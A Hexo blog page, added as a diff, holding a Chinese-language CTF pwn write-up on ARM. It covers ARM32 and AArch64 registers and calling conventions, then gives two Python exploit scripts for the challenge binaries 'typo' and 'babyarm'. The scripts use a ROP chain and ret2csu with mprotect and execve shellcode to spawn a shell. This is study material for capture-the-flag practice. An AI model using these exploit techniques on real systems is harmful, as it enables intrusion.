@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="arm初探">
+<meta property="og:type" content="article">
+<meta property="og:title" content="arm-初探">
+<meta property="og:url" content="http://example.com/2023/11/13/arm-%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="arm初探">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-13T15:45:20.000Z">
+<meta property="article:modified_time" content="2023-11-14T14:11:46.524Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="arm">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2023/11/13/arm-%E5%88%9D%E6%8E%A2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>arm-初探 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/13/arm-%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          arm-初探
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-11-13 23:45:20" itemprop="dateCreated datePublished" datetime="2023-11-13T23:45:20+08:00">2023-11-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-11-14 22:11:46" itemprop="dateModified" datetime="2023-11-14T22:11:46+08:00">2023-11-14</time>
+              </span>
+
+          
+            <div class="post-description">arm初探</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 根据各位大师傅的博客搭好调试的环境</p>
+<p>ARM32&#x3D;ARMv7</p>
+<p>ARM64&#x3D;AARCH64&#x3D;ARMv8</p>
+<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>在arm中，调用函数是以<strong>r0~r3</strong>这四个寄存器为参数的，剩下的参数从右到左依次放入栈中，同时，函数返回值放在r0寄存器中。</p>
+<p>arm中的b&#x2F;bl指令用来实现跳转，而pc寄存器相当于x86中的eip，保存下一条指令的地址。</p>
+<p>在arm中gadget多是pop {xx,xx,xx,pc}以pc寄存器结尾的,至少本题是</p>
+<p>对于ret2svc(arm中的arm)，r7类似于rax寄存器，存储函数调用号，svc指令类似于syscall，用于执行系统调用</p>
+<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from ownpwn.mypwn import *</span><br><span class="line">io=setup(&quot;./typo&quot;,arch=&quot;arm32&quot;)</span><br><span class="line">#shellcode=b&quot;\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00&quot;</span><br><span class="line">system=0x000110B4</span><br><span class="line">binsh=0x0006C384</span><br><span class="line">p7=0x00014068</span><br><span class="line">p0_4=0x00020904</span><br><span class="line">p1=0x00068bec</span><br><span class="line">p4_7=0x00023dbc</span><br><span class="line">p3=0x00008160</span><br><span class="line">mov_2_4=0x0003338c</span><br><span class="line">svc=0x0000fed0</span><br><span class="line">payload=cyclic(112)+p32(p0_4)+p32(binsh)+p32(0)+p32(p1)+p32(0)+p32(p4_7)+p32(0)+p32(0xb)+p32(p3)+p32(svc)+p32(mov_2_4)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">r0=/bin/sh</span><br><span class="line">r1=0</span><br><span class="line">r2=0</span><br><span class="line">r7=0xb</span><br><span class="line">mov_2_4;bl r3</span><br><span class="line">r3=svc</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#payload=cyclic(112)+p32(p0_4)+p32(binsh)*2+p32(system)</span><br><span class="line">sa(&quot;quit&quot;,&quot;\n&quot;)</span><br><span class="line">sa(&quot;------Begin------&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h1><p>arm64的指令和寄存器等，与arm32多少有点出入</p>
+<p>x0-x31为通用寄存器</p>
+<p>x0-x7用于参数传递</p>
+<p>x9-x15在子函数中，可直接使用这些寄存器，无需save&#x2F;restore</p>
+<p>x19-x29在callee等子函数中使用这些，一般需要先save，在退出子函数时再resotre</p>
+<p>x8，x16-x18，x29，x30是特殊用途的寄存器</p>
+<p>x8相当于rax&#x2F;r7，用于存储函数返回值</p>
+<p>x16-x16用于进程内临时寄存器</p>
+<p>x18通常被保留给应用二进制接口（ABI）</p>
+<p>x29类似于rbp寄存器，用于指向栈帧，即fp</p>
+<p>X30 是链接寄存器，也就是存储返回地址的寄存器</p>
+<p>SP寄存器则是类似于rsp寄存器，指向栈顶</p>
+<p>PC类似于eip</p>
+<h1 id="babyarm"><a href="#babyarm" class="headerlink" title="babyarm"></a>babyarm</h1><p>本题中没有pop的gadget，但可以利用arm64下的ret2csu</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008AC                               loc_4008AC                              ; CODE XREF: init+60↓j</span><br><span class="line">.text:00000000004008AC A3 7A 73 F8                   LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0 E2 03 16 AA                   MOV             X2, X22</span><br><span class="line">.text:00000000004008B4 E1 03 17 AA                   MOV             X1, X23</span><br><span class="line">.text:00000000004008B8 E0 03 18 2A                   MOV             W0, W24</span><br><span class="line">.text:00000000004008BC 73 06 00 91                   ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0 60 00 3F D6                   BLR             X3</span><br><span class="line">.text:00000000004008C0</span><br><span class="line">.text:00000000004008C4 7F 02 14 EB                   CMP             X19, X20</span><br><span class="line">.text:00000000004008C8 21 FF FF 54                   B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008C8</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC                               loc_4008CC                              ; CODE XREF: init+3C↑j</span><br><span class="line">.text:00000000004008CC F3 53 41 A9                   LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0 F5 5B 42 A9                   LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4 F7 63 43 A9                   LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8 FD 7B C4 A8                   LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC C0 03 5F D6                   RET</span><br></pre></td></tr></table></figure>
+
+<p>直接从栈上就可控制寄存器，控制寄存器执行mprotect，执行shellcode，注意要对齐，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from ownpwn.mypwn import *</span><br><span class="line">io=setup(&quot;./pwn&quot;,arch=&quot;arm64&quot;,arch_lib=&quot;/usr/aarch64-linux-gnu/&quot;,gdb_port=&quot;1234&quot;)</span><br><span class="line"></span><br><span class="line">csu_1=0x4008CC</span><br><span class="line">csu_2=0x4008AC</span><br><span class="line"></span><br><span class="line">mprotect_plt=0x400600</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.execve(&quot;/bin/sh&quot;))</span><br><span class="line">offset=72</span><br><span class="line">payload1=p64(mprotect_plt)+shellcode</span><br><span class="line">sa(&quot;Name:&quot;,payload1)</span><br><span class="line"></span><br><span class="line">payload2=cyclic(offset)+p64(csu_1)+p64(0xdeadbeef)+p64(csu_2)+p64(0)+p64(1)+p64(0x411068)+p64(7)+p64(0x268)+p64(0x411000)+p64(0)+p64(0x411068+8)</span><br><span class="line"></span><br><span class="line">s(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/arm/" rel="tag"># arm</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/12/2022-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-smallcontainer/" rel="prev" title="2022-巅峰极客-smallcontainer">
+      <i class="fa fa-chevron-left"></i> 2022-巅峰极客-smallcontainer
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#typo"><span class="nav-number">2.</span> <span class="nav-text">typo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#aarch64"><span class="nav-number">3.</span> <span class="nav-text">aarch64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babyarm"><span class="nav-number">4.</span> <span class="nav-text">babyarm</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
